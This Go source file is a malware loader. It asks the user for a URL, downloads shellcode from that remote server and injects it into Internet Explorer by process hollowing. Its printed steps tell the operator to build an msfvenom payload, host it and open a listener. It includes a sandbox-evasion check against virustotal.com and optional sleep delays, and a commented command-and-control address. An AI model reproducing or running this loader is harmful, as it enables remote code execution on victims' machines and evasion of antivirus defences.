package main

import (
	"bufio"
	"fmt"
	"os"
	"reflect"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/D3Ext/maldev/network"
	"github.com/D3Ext/maldev/shellcode"
)

func network_Checks(checkDomain string) bool {
	teknoUp, _ := network.GetStatusCode(checkDomain)
	if teknoUp != 200 {
		return false
	}
	// c2Up, _ := network.GetStatusCode(c2Address)
	// if c2Up != 200 {
	// 	return false
	// }
	return true
}

func wasteTime() {
	time.Sleep(8 * time.Second)
}

func main() {
	checkDomain := "https://virustotal.com"
	//c2Address := "http://192.168.0.106"
	//dlURL := c2Address + "/RAW.bin"
	user32 := syscall.NewLazyDLL("user32.dll")
	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Saba7ooo. Follow the steps below:")
	fmt.Println("Generate some exe payload using msfvenom or any other payload generator. DO NOT USE DONUT OR CONVERT IT TO POSITION INDEPENDANT SHELLCODE !!!")
	fmt.Println("Rename the payload to <something>.bin")
	fmt.Println("Open a http server on any port you want.")
	fmt.Println("Setup a listener for the payload you generated.")
	fmt.Println("Run resources.exe but ig you already did that.")
	fmt.Println("Supply the full shellcode URL:")
	dlURL, err := reader.ReadString('\n')
	if err != nil {
		panic(err)
	}
	dlURL = strings.TrimSuffix(dlURL, "\n")
	dlURL = strings.TrimSuffix(dlURL, "\r")
	messageBoxA := user32.NewProc("MessageBoxA")
	message := "Watch the Magic Happen :) Hopefully\x00"
	hdr := (*reflect.StringHeader)(unsafe.Pointer(&message))
	messageBoxA.Call(0, uintptr(hdr.Data), uintptr(hdr.Data), 0)
	runtime.KeepAlive(message)

	//Uncomment these iza baddak some sleep obfuscation w suspense
	//wasteTime()
	// if wasted <= 10 {
	// 	os.Exit(1) //Error Code 1 in my case implies we did not waste enough time
	// }
	nChecks := network_Checks(checkDomain)
	if nChecks == false {
		os.Exit(2) //Error Code 2 implies the networck Checks failed
	}

	sc, err := shellcode.GetShellcodeFromUrl(dlURL)
	if err != nil {
		panic(err)
	}
	//wasteTime()
	fmt.Println("The shellcode you have supplied will execute within the context of iexplorer.exe")
	Inject("C:\\Program Files\\Internet Explorer\\iexplore.exe", sc)
	fmt.Println("Successful Process Hollowing")
}
